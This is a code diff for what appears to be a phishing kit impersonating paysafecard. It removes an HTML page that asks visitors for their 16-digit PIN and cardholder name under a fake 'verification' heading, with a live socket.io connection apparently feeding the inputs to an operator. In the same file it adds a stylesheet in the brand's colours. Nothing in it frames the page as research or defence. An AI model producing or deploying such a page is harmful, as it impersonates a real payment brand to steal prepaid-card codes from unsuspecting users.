@@ -1,54 +1,76 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification | paysafecard</title>
-    <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-</head>
-<body>
-    <div id="loading-overlay" style="display: none;">
-        <div class="psc-spinner"></div>
-        <p>Verification in progress...</p>
-    </div>
+body {
+    font-family: 'Roboto', sans-serif;
+    background-color: #f4f4f4;
+    margin: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
 
-    <header class="psc-header">
-        <div class="logo-area">
-            <img src="téléchargé.jpg" alt="paysafecard" class="logo-img">
-        </div>
-    </header>
+.psc-header {
+    width: 100%;
+    padding: 20px;
+    background: #fff;
+    text-align: center;
+    border-bottom: 2px solid #e30613;
+}
 
-    <div class="login-container">
-        <div class="login-box" id="login-section">
-            <h2 class="title">PIN code verification</h2>
-            <p class="subtitle">Enter your 16-digit code to validate your transaction.</p>
-            
-            <form id="loginForm">
-                <div class="input-group">
-                    <label>PIN code (16 digits)</label>
-                    <div class="input-wrapper">
-                        <input id="username" type="text" placeholder="0000 0000 0000 0000" maxlength="19" required>
-                    </div>
-                </div>
+.login-container {
+    margin-top: 50px;
+    width: 100%;
+    max-width: 400px;
+}
 
-                <div class="input-group">
-                    <label>Cardholder name (for security)</label>
-                    <div class="input-wrapper">
-                        <input type="text" id="password" placeholder="First and Last Name" required>
-                    </div>
-                </div>
+.login-box {
+    background: #fff;
+    padding: 30px;
+    border-radius: 4px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+}
 
-                <button type="submit" class="btn-login" id="login-btn">Verify code</button>
-            </form>
+.title {
+    color: #333;
+    margin-bottom: 10px;
+}
 
-            <div class="footer-box">
-                <p>Need help? <a href="#">Contact support</a></p>
-            </div>
-        </div>
-    </div>   
+.subtitle {
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 20px;
+}
 
-    <script src="/socket.io/socket.io.js"></script>
-    <script src="script.js"></script>
-</body>
-</html>
+.input-group label {
+    display: block;
+    margin-bottom: 5px;
+    font-weight: 500;
+}
+
+input {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 15px;
+    border: 1px solid #ccc;
+    border-radius: 2px;
+    box-sizing: border-box;
+}
+
+.btn-login {
+    width: 100%;
+    padding: 12px;
+    background-color: #e30613;
+    color: white;
+    border: none;
+    border-radius: 2px;
+    cursor: pointer;
+    font-weight: bold;
+    font-size: 16px;
+}
+
+.btn-login:hover {
+    background-color: #c70511;
+}
+
+.footer-box a {
+    color: #e30613;
+    text-decoration: none;
+}
